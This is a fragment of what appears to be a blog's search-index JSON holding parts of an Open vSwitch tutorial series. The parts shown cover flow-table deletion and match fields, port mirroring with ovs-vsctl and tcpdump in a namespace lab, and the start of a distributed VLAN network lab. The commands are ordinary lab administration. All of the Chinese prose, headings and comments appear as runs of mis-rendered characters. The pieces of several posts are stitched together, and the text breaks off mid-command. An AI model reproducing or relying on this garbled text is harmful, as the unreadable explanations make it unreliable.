(æµè¡¨åŒ¹é…æ¡ä»¶){\n\tåŠ¨ä½œ1ï¼Œ\n\tåŠ¨ä½œ2...\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"åˆ é™¤æµè¡¨è§„åˆ™\"\u003eåˆ é™¤æµè¡¨è§„åˆ™\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# åˆ é™¤br-tunä¸Šçš„å…¨éƒ¨æµè¡¨è§„åˆ™\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-ofctl del-flows br-tun\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# åˆ é™¤br-tunä¸ŠåŒ¹é…xxçš„å…¨éƒ¨æµè¡¨è§„åˆ™\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-ofctl del-flows br-tun xx  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"æµè¡¨åŒ¹é…æ¡ä»¶\"\u003eæµè¡¨åŒ¹é…æ¡ä»¶\u003c/h1\u003e\n\u003cp\u003eOVS æµè¡¨åŒ¹é…æ¡ä»¶è¾ƒå¤šï¼Œä¸‹é¢æˆ‘å°†å…¶åˆ†æˆå››éƒ¨åˆ†æ¥è¯´æ˜ï¼Œåˆ†åˆ«æ˜¯:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOVSåŒ¹é…æ¡ä»¶\u003c/li\u003e\n\u003cli\u003eOSIæ¨¡å‹ç¬¬äºŒå±‚ã€æ•°æ®é“¾è·¯å±‚ã€‘\u003c/li\u003e\n\u003cli\u003eOSIæ¨¡å‹ç¬¬ä¸‰å±‚ã€ç½‘ç»œå±‚ã€‘\u003c/li\u003e\n\u003cli\u003eOSIæ¨¡å‹ç¬¬å››å±‚ã€ä¼ è¾“å±‚ã€‘\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ovsåŒ¹é…æ¡ä»¶\"\u003eOVSåŒ¹é…æ¡ä»¶\u003c/h2\u003e\n\u003ch3 id=\"in_portport\"\u003ein_port=port\u003c/h3\u003e\n\u003cp\u003eæµé‡è¿›å…¥çš„ç«¯å£ç¼–å·æˆ–è€…åç§°ï¼Œç¤ºä¾‹ \u003ccode\u003ein_port=br-int\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"tablenumber\"\u003etable=number\u003c/h3\u003e\n\u003cp\u003eè§„åˆ™ä¿å­˜çš„æµè¡¨ç¼–å·ï¼ŒèŒƒå›´æ˜¯ 0-254ï¼Œé»˜è®¤å€¼ï¼š0ã€‚\u003c/p\u003e\n\u003ch2 id=\"osiæ¨¡å‹ç¬¬äºŒå±‚æ•°æ®é“¾è·¯å±‚\"\u003eOSIæ¨¡å‹ç¬¬äºŒå±‚ã€æ•°æ®é“¾è·¯å±‚ã€‘\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003e\u003ccode\u003edl\u003c/code\u003e å³æ˜¯ \u003ccode\u003edata link\u003c/code\u003e çš„ç¼©å†™ã€‚\u003c/em\u003e\u003c/p\u003e\n\u003ch3 id=\"dl_typeethertype\"\u003edl_type=ethertype\u003c/h3\u003e\n\u003cp\u003eåŒ¹é…ä»¥å¤ªç½‘åè®®ç±»å‹ä»¥å¤ªç±»å‹ï¼Œä»¥10åˆ°65535ä¹‹é—´çš„æ•´æ•°ï¼ˆåŒ…æ‹¬0å’Œ65535ï¼‰æŒ‡å®šï¼Œä»¥åè¿›åˆ¶æˆ–ä»¥0xå‰ç¼€çš„åå…­è¿›åˆ¶æ•°è¡¨ç¤ºï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003edl_type=0x0800\u003c/code\u003e åŒ¹é…IPv4æ•°æ®åŒ…ï¼Œç­‰åŒäº\u003ccode\u003edl_type=ip\u003c/code\u003e ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003edl_type=0x086dd\u003c/code\u003e åŒ¹é…IPv6æ•°æ®åŒ…ï¼Œç­‰åŒäº\u003ccode\u003edl_type=ipv6\u003c/code\u003e ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003edl_type=0x0806\u003c/code\u003e åŒ¹é…ARPæ•°æ®åŒ…ï¼Œç­‰åŒäº\u003ccode\u003edl_type=arp\u003c/code\u003e ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003edl_type=0x8035\u003c/code\u003e åŒ¹é…RARPæ•°æ®åŒ…ï¼Œç­‰åŒäº \u003ccode\u003edl_type=rarp\u003c/code\u003eã€‚\u003c/p\u003e","title":"Open vSwitch å…¥é—¨å®è·µï¼ˆ5ï¼‰OVS Flow Table æµè¡¨è§„åˆ™"},{"content":"å‰è¨€ å½“æˆ‘ä»¬æƒ³è¦åœ¨ä¸å½±å“è™šæ‹Ÿç½‘ç»œè®¾å¤‡æ•°æ®æŠ¥æ–‡æ”¶å‘çš„æƒ…å†µä¸‹è·å–å¯¹åº”è™šæ‹Ÿç½‘ç»œè®¾å¤‡çš„æµé‡æ—¶ï¼Œç«¯å£é•œåƒæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚ç«¯å£é•œåƒæ˜¯æŒ‡å°†ç»è¿‡æŒ‡å®šç«¯å£ï¼ˆé•œåƒç«¯å£ï¼‰çš„æŠ¥æ–‡å¤åˆ¶ä¸€ä»½åˆ°å¦ä¸€ä¸ªæŒ‡å®šç«¯å£ï¼ˆè§‚å¯Ÿç«¯å£ï¼‰ï¼Œé€šè¿‡è§‚å¯Ÿç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡ï¼Œå°±å¯ä»¥æœ‰æ•ˆè¯†åˆ«è™šæ‹Ÿç½‘ç»œçš„è¿è¡Œæƒ…å†µã€‚\nOVSæä¾›äº†ç›¸å…³å‘½ä»¤æ¥é…ç½®æˆ–åˆ é™¤ç«¯å£é•œåƒï¼Œä¸‹é¢æˆ‘ä»¬æ¥å®éªŒä¸€ä¸‹ã€‚\nå¦‚ä½•ä½¿ç”¨ ç«¯å£é•œåƒç±»å‹ ç«¯å£é•œåƒåˆ†ä¸ºé•œåƒæºå’Œé•œåƒç›®çš„ä¸¤éƒ¨åˆ†ã€‚\né•œåƒæº select_allï¼šå¸ƒå°”ç±»å‹ï¼ˆtrueï¼Œfalseï¼‰ã€‚è®¾ç½®ä¸º true æ—¶ï¼Œè¡¨ç¤ºæ­¤ç½‘æ¡¥ä¸Šçš„æ‰€æœ‰æµé‡ã€‚ select_dst_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚è¡¨ç¤ºæ­¤ç«¯å£æ¥æ”¶çš„æ‰€æœ‰æµé‡ã€‚ select_src_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚è¡¨ç¤ºæ­¤ç«¯å£å‘é€çš„æ‰€æœ‰æµé‡ã€‚ select_vlanï¼šæ•´å‹ï¼ˆ0-4095ï¼‰ã€‚è¡¨ç¤ºæºå¸¦æ­¤VLANæ ‡ç­¾çš„æµé‡ã€‚ é•œåƒç›®çš„ output_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚æ¥æ”¶æµé‡æŠ¥æ–‡çš„è§‚å¯Ÿç«¯å£ã€‚ output_vlanï¼šæ•´å‹ï¼ˆ0-4095ï¼‰ã€‚è¡¨ç¤ºåªä¿®æ”¹VLANæ ‡ç­¾ï¼ŒåŸVLANæ ‡ç­¾ä¼šè¢«å‰¥ç¦»ã€‚ åŸºç¡€æ“ä½œå‘½ä»¤ æ–°å¢ç«¯å£é•œåƒ\novs-vsctl -- set Bridge \u0026lt;bridge_name\u0026gt; mirrors=@m \\ -- --id=@\u0026lt;port0\u0026gt; get Port \u0026lt;port0\u0026gt; \\ -- --id=@\u0026lt;port1\u0026gt; get Port \u0026lt;port1\u0026gt; \\ -- --id=@m create Mirror name=\u0026lt;mirror_name\u0026gt; select-dst-port=@\u0026lt;port0\u0026gt; select-src-port=@\u0026lt;port0\u0026gt; output-port=@\u0026lt;port1\u0026gt; è¿™è¡Œå‘½ä»¤ä¼šè¾“å‡ºä¸€ä¸ªé•œåƒID\nåˆ é™¤ç«¯å£é•œåƒ\novs-vsctl remove Bridge \u0026lt;bridge-name\u0026gt; mirrors \u0026lt;mirror-id\u0026gt; åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ªé•œåƒæº\n# è·å–ç«¯å£çš„ID ovs-vsctl get port \u0026lt;port_name\u0026gt; _uuid # åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ é•œåƒæº ovs-vsctl add Mirror \u0026lt;mirror-name\u0026gt; select_src_port \u0026lt;port-id\u0026gt; ovs-vsctl add Mirror \u0026lt;mirror-name\u0026gt; select_dst_port \u0026lt;port-id\u0026gt; åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šåˆ é™¤ä¸€ä¸ªé•œåƒæº\n# è·å–ç«¯å£çš„ID ovs-vsctl get port \u0026lt;port_name\u0026gt; _uuid ovs-vsctl remove Mirror \u0026lt;mirror-name\u0026gt; select_src_port \u0026lt;port-id\u0026gt; ovs-vsctl remove Mirror \u0026lt;mirror-name\u0026gt; select_dst_port \u0026lt;port-id\u0026gt; æ¸…ç©ºç«¯å£é•œåƒ\novs-vsctl clear Mirror æŸ¥çœ‹ç«¯å£é•œåƒ\novs-vsctl list Mirror å…³é—­ç«¯å£çš„MACåœ°å€å­¦ä¹ \novs-ofctl mod-port \u0026lt;bridge-name\u0026gt; \u0026lt;port-name\u0026gt; NO-FLOOD å®éªŒ å®éªŒæ‹“æ‰‘ å®éªŒæ‹“æ‰‘åˆ†ä¸ºä¸€ä¸ªç½‘æ¡¥ï¼Œä¸‰ä¸ªè™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œ\n# æ·»åŠ ç½‘æ¡¥ ovs-vsctl add-br br-int # æ·»åŠ ä¸‰ä¸ªå†…éƒ¨ç«¯å£ ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal ovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type=internal # æ·»åŠ ä¸‰ä¸ªnetns ip netns add ns0 ip netns add ns1 ip netns add ns2 # å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­ ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 ip link set vnet2 netns ns2 # å¯åŠ¨ç«¯å£å¹¶é…ç½®IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set vnet1 up ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1 # æ³¨æ„è¿™é‡Œåªå¯åŠ¨äº†ç½‘å¡ï¼Œä½†æ²¡æœ‰é…ç½®IP ip netns exec ns2 ip link set lo up ip netns exec ns2 ip link set vnet2 up ovs-vsctl -- set Bridge br-int mirrors=@m \\ -- --id=@vnet1 get Port vnet1 \\ -- --id=@vnet2 get Port vnet2 \\ -- --id=@m create Mirror name=mirror_test select-dst-port=@vnet1 select-src-port=@vnet1 output-port=@vnet2 æµ‹è¯• æ‰§è¡Œä»¥ä¸‹å‘½ä»¤äº§ç”Ÿæµé‡\nip netns exec ns0 ping 10.0.0.2 é‡æ–°æ‰“å¼€ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æŠ“åŒ…\nip netns exec ns2 tcpdump -i vnet2 éœ€è¦å®‰è£…tcpdumpæ‰èƒ½ä½¿ç”¨\nè¾“å‡º\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on vnet2, link-type EN10MB (Ethernet), capture size 262144 bytes 22:26:31.140974 IP 10.0.0.1 \u0026gt; 10.0.0.2: ICMP echo request, id 4599, seq 23, length 64 22:26:31.140996 IP 10.0.0.2 \u0026gt; 10.0.0.1: ICMP echo reply, id 4599, seq 23, length 64 22:26:32.141066 IP 10.0.0.1 \u0026gt; 10.0.0.2: ICMP echo request, id 4599, seq 24, length 64 22:26:32.141085 IP 10.0.0.2 \u0026gt; 10.0.0.1: ICMP echo reply, id 4599, seq 24, length 64 22:26:33.141066 IP 10.0.0.1 \u0026gt; 10.0.0.2: ICMP echo request, id 4599, seq 25, length 64 22:26:33.141108 IP 10.0.0.2 \u0026gt; 10.0.0.1: ICMP echo reply, id 4599, seq 25, length 64 22:26:34.141044 IP 10.0.0.1 \u0026gt; 10.0.0.2: ICMP echo request, id 4599, seq 26, length 64 22:26:34.141062 IP 10.0.0.2 \u0026gt; 10.0.0.1: ICMP echo reply, id 4599, seq 26, length 64 ^C 8 packets captured 8 packets received by filter 0 packets dropped by kernel æ¸…ç†å®éªŒç¯å¢ƒ ip netns del ns0 ip netns del ns1 ip netns del ns2 ovs-vsctl del-br br-int ","permalink":"https://www.typesafe.cn/posts/ovs-learn-4/","summary":"\u003ch1 id=\"å‰è¨€\"\u003eå‰è¨€\u003c/h1\u003e\n\u003cp\u003eå½“æˆ‘ä»¬æƒ³è¦åœ¨ä¸å½±å“è™šæ‹Ÿç½‘ç»œè®¾å¤‡æ•°æ®æŠ¥æ–‡æ”¶å‘çš„æƒ…å†µä¸‹è·å–å¯¹åº”è™šæ‹Ÿç½‘ç»œè®¾å¤‡çš„æµé‡æ—¶ï¼Œç«¯å£é•œåƒæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚ç«¯å£é•œåƒæ˜¯æŒ‡å°†ç»è¿‡æŒ‡å®šç«¯å£ï¼ˆé•œåƒç«¯å£ï¼‰çš„æŠ¥æ–‡å¤åˆ¶ä¸€ä»½åˆ°å¦ä¸€ä¸ªæŒ‡å®šç«¯å£ï¼ˆè§‚å¯Ÿç«¯å£ï¼‰ï¼Œé€šè¿‡è§‚å¯Ÿç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡ï¼Œå°±å¯ä»¥æœ‰æ•ˆè¯†åˆ«è™šæ‹Ÿç½‘ç»œçš„è¿è¡Œæƒ…å†µã€‚\u003c/p\u003e\n\u003cp\u003eOVSæä¾›äº†ç›¸å…³å‘½ä»¤æ¥é…ç½®æˆ–åˆ é™¤ç«¯å£é•œåƒï¼Œä¸‹é¢æˆ‘ä»¬æ¥å®éªŒä¸€ä¸‹ã€‚\u003c/p\u003e\n\u003ch1 id=\"å¦‚ä½•ä½¿ç”¨\"\u003eå¦‚ä½•ä½¿ç”¨\u003c/h1\u003e\n\u003ch3 id=\"ç«¯å£é•œåƒç±»å‹\"\u003eç«¯å£é•œåƒç±»å‹\u003c/h3\u003e\n\u003cp\u003eç«¯å£é•œåƒåˆ†ä¸ºé•œåƒæºå’Œé•œåƒç›®çš„ä¸¤éƒ¨åˆ†ã€‚\u003c/p\u003e\n\u003ch4 id=\"é•œåƒæº\"\u003eé•œåƒæº\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eselect_allï¼šå¸ƒå°”ç±»å‹ï¼ˆtrueï¼Œfalseï¼‰ã€‚è®¾ç½®ä¸º true æ—¶ï¼Œè¡¨ç¤ºæ­¤ç½‘æ¡¥ä¸Šçš„æ‰€æœ‰æµé‡ã€‚\u003c/li\u003e\n\u003cli\u003eselect_dst_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚è¡¨ç¤ºæ­¤ç«¯å£æ¥æ”¶çš„æ‰€æœ‰æµé‡ã€‚\u003c/li\u003e\n\u003cli\u003eselect_src_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚è¡¨ç¤ºæ­¤ç«¯å£å‘é€çš„æ‰€æœ‰æµé‡ã€‚\u003c/li\u003e\n\u003cli\u003eselect_vlanï¼šæ•´å‹ï¼ˆ0-4095ï¼‰ã€‚è¡¨ç¤ºæºå¸¦æ­¤VLANæ ‡ç­¾çš„æµé‡ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"é•œåƒç›®çš„\"\u003eé•œåƒç›®çš„\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eoutput_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚æ¥æ”¶æµé‡æŠ¥æ–‡çš„è§‚å¯Ÿç«¯å£ã€‚\u003c/li\u003e\n\u003cli\u003eoutput_vlanï¼šæ•´å‹ï¼ˆ0-4095ï¼‰ã€‚è¡¨ç¤ºåªä¿®æ”¹VLANæ ‡ç­¾ï¼ŒåŸVLANæ ‡ç­¾ä¼šè¢«å‰¥ç¦»ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"åŸºç¡€æ“ä½œå‘½ä»¤\"\u003eåŸºç¡€æ“ä½œå‘½ä»¤\u003c/h3\u003e\n\u003cp\u003eæ–°å¢ç«¯å£é•œåƒ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl -- set Bridge \u0026lt;bridge_name\u0026gt; mirrors\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e@m \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e -- --id\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e@\u0026lt;port0\u0026gt; get Port \u0026lt;port0\u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e -- --id\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e@\u0026lt;port1\u0026gt; get Port \u0026lt;port1\u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e -- --id\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e@m create Mirror name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u0026lt;mirror_name\u0026gt; \u003cspan style=\"color:#66d9ef\"\u003eselect\u003c/span\u003e-dst-port\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e@\u0026lt;port0\u0026gt; \u003cspan style=\"color:#66d9ef\"\u003eselect\u003c/span\u003e-src-port\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e@\u0026lt;port0\u0026gt; output-port\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e@\u0026lt;port1\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003eè¿™è¡Œå‘½ä»¤ä¼šè¾“å‡ºä¸€ä¸ªé•œåƒID\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eåˆ é™¤ç«¯å£é•œåƒ\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eovs-vsctl remove Bridge \u0026lt;bridge-name\u0026gt; mirrors \u0026lt;mirror-id\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eåœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ªé•œåƒæº\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# è·å–ç«¯å£çš„ID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl get port \u0026lt;port_name\u0026gt; _uuid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ é•œåƒæº\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add Mirror \u0026lt;mirror-name\u0026gt; select_src_port \u0026lt;port-id\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add Mirror \u0026lt;mirror-name\u0026gt; select_dst_port \u0026lt;port-id\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šåˆ é™¤ä¸€ä¸ªé•œåƒæº\u003c/p\u003e","title":"Open vSwitch å…¥é—¨å®è·µï¼ˆ4ï¼‰ä½¿ç”¨OVSé…ç½®ç«¯å£é•œåƒ"},{"content":"ä½¿ç”¨OVSæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ å‰è¨€ ä¸Šä¸€èŠ‚æˆ‘ä»¬ä½¿ç”¨OVSæ„å»ºäº†å•æœºéš”ç¦»ç½‘ç»œï¼Œä½†æ˜¯éšç€ç½‘ç»œè§„æ¨¡çš„æ‰©å¼ ï¼Œå•èŠ‚ç‚¹å·²ç»ä¸å†èƒ½æ»¡è¶³ä¸šåŠ¡çš„éœ€è¦ï¼Œåˆ†å¸ƒå¼ç½‘ç»œæˆäº†å¿…ä¸å¯å°‘çš„ç¯èŠ‚ã€‚åˆ†å¸ƒå¼ç½‘ç»œä¸å•èŠ‚ç‚¹ç½‘ç»œåœ¨ç»†èŠ‚å®ç°ä¸ŠåŸºæœ¬ä¸€è‡´ï¼Œåªæœ‰ç‰©ç†ç¯å¢ƒç½‘ç»œè¿çº¿ä¸Šçš„ä¸€ç‚¹åŒºåˆ«ã€‚\nå®éªŒ1ï¼šåˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ ç½‘ç»œæ‹“æ‰‘å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬æ¯ä¸€å°èŠ‚ç‚¹éƒ½æœ‰ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ ç”¨äºç®¡ç†ï¼Œä¸€å¼ ç”¨äºä¸šåŠ¡ã€‚ä¹‹æ‰€ä»¥ä½¿ç”¨ä¸¤å¼ ç½‘å¡æœ‰ä¸¤ä¸ªåŸå› ï¼š\nç®¡ç†ç½‘å¡ç”¨äºæ—¥å¸¸çš„ç»´æŠ¤ç™»å½•ï¼Œä¸šåŠ¡ç½‘å¡ç”¨äºä¼ è¾“è™šæ‹ŸèŠ‚ç‚¹çš„æ•°æ®æŠ¥æ–‡ï¼Œé¿å…ç›¸äº’ä¹‹é—´å½±å“ã€‚ æˆ‘ä»¬è¦å°†ä¸šåŠ¡ç½‘å¡ç»‘å®šåˆ°OVSç½‘æ¡¥ä¸Šï¼Œä¹Ÿå°±æ˜¯Normalç±»å‹çš„Portã€‚è¿™ç§æ–¹å¼æ·»åŠ çš„Portä¸æ”¯æŒåˆ†é…IPåœ°å€ï¼Œå¦‚æœä¹‹å‰ç½‘å¡ä¸Šé…ç½®çš„æœ‰IPï¼ŒæŒ‚è½½åˆ°OVSä¸Šé¢ä¹‹åå°†ä¸å¯è®¿é—®ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ˜¯ä½¿ç”¨ç‰©ç†ç¯å¢ƒæ­å»ºç½‘ç»œæ‹“æ‰‘ï¼Œéœ€è¦æŠŠä¸šåŠ¡ç½‘å¡å¯¹åº”çš„äº¤æ¢æœºç«¯å£é…ç½®ä¸ºtrunkæ¨¡å¼ã€‚å¦‚æœæ˜¯ä½¿ç”¨VmWareæ­å»ºç½‘ç»œæ‹“æ‰‘ï¼Œä¸šåŠ¡ç½‘å¡éœ€è¦é…ç½®ç½‘ç»œç±»å‹ä¸ºä»…ä¸»æœºæ¨¡å¼ã€‚\né…ç½® é…ç½®ç¯å¢ƒ ä¸»æœºA ovs-vsctl add-br br-int # è¯·ä¿®æ”¹eth1ä¸ºå½“å‰å®éªŒç¯å¢ƒçš„ä¸šåŠ¡ç½‘å¡åç§° ovs-vsctl add-port br-int eth1 # æ·»åŠ ä¸¤ä¸ªå†…éƒ¨ç«¯å£ ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal # æ·»åŠ ä¸¤ä¸ªnetns ip netns add ns0 ip netns add ns1 # å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­ ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 # å¯åŠ¨ç«¯å£å¹¶é…ç½®IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set vnet1 up ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1 é…ç½®ç¯å¢ƒ ä¸»æœºB ovs-vsctl add-br br-int # è¯·ä¿®æ”¹eth1ä¸ºå½“å‰å®éªŒç¯å¢ƒçš„ä¸šåŠ¡ç½‘å¡åç§° ovs-vsctl add-port br-int eth1 # æ·»åŠ ä¸¤ä¸ªå†…éƒ¨ç«¯å£ ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal # æ·»åŠ ä¸¤ä¸ªnetns ip netns add ns0 ip netns add ns1 # å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­ ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 # å¯åŠ¨ç«¯å£å¹¶é…ç½®IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.0.0.3/24 dev vnet0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set vnet1 up ip netns exec ns1 ip addr add 10.0.0.4/24 dev vnet1 æµ‹è¯• æµ‹è¯• ä¸»æœºA ip netns exec ns0 ping 10.0.0.3 ip netns exec ns0 ping 10.0.0.4 ip netns exec ns1 ping 10.0.0.3 ip netns exec ns1 ping 10.0.0.4 æµ‹è¯• ä¸»æœºB ip netns exec ns0 ping 10.0.0.1 ip netns exec ns0 ping 10.0.0.2 ip netns exec ns1 ping 10.0.0.1 ip netns exec ns1 ping 10.0.0.2 æµ‹è¯•ç»“æœ ä¸»æœºA ä¸»æœºB ping ç»“æœ ns0 ns0 å¯é€šä¿¡ âœ… ns0 ns1 å¯é€šä¿¡ âœ… ns1 ns0 å¯é€šä¿¡ âœ… ns1 ns1 å¯é€šä¿¡ âœ… æ ¹æ®æµ‹è¯•ç»“æœå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨OVSæˆåŠŸçš„è”é€šäº†åˆ†å¸ƒåœ¨ä¸åŒä¸»æœºä¸Šçš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚\nå®éªŒ2ï¼šåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ æ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œå’Œå•èŠ‚ç‚¹çš„æ“ä½œæ–¹æ³•ä¸€è‡´ï¼Œå³ç»™å¯¹åº”çš„ç«¯å£é…ç½®VLAN tagã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬åˆ†åˆ«ç»™ä¸»æœºAã€Bä¸Šçš„ç«¯å£é…ç½®VLAN tagä¸º100å’Œ200ã€‚\né…ç½® é…ç½®ç¯å¢ƒ ä¸»æœºA ovs-vsctl set Port vnet0 tag=100 ovs-vsctl set Port vnet1 tag=200 é…ç½®ç¯å¢ƒ ä¸»æœºB ovs-vsctl set Port vnet0 tag=100 ovs-vsctl 